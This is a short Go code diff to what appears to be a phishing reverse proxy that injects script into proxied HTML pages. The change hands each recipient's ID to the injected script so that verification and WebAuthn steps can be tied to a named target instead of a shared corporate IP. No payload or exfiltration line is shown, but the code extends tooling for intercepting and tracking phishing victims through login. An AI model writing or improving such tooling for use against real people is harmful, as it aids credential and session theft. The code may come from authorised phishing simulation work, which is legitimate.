@@ -1327,7 +1327,21 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				if stringExists(mime, []string{"text/html"}) {
 					if p.jsInspector != nil {
-						injectedBody := p.jsInspector.InjectHTML(body)
+						// The recipient ID is handed to the injected script
+						// so its assertion can name the target it came from.
+						// Without it, the verify and webauthn stages are
+						// unattributed and the report has to fall back to
+						// correlating them by client IP, which conflates
+						// everyone behind one corporate NAT egress. The
+						// session is already resolvable here, so the
+						// attribution costs a map lookup.
+						injectRID := ""
+						if ps.SessionId != "" {
+							if s, ok := p.getSession(ps.SessionId); ok {
+								injectRID = s.RId
+							}
+						}
+						injectedBody := p.jsInspector.InjectHTML(body, injectRID)
 						jsInspectInjected = len(injectedBody) != len(body)
 						body = injectedBody
 					}
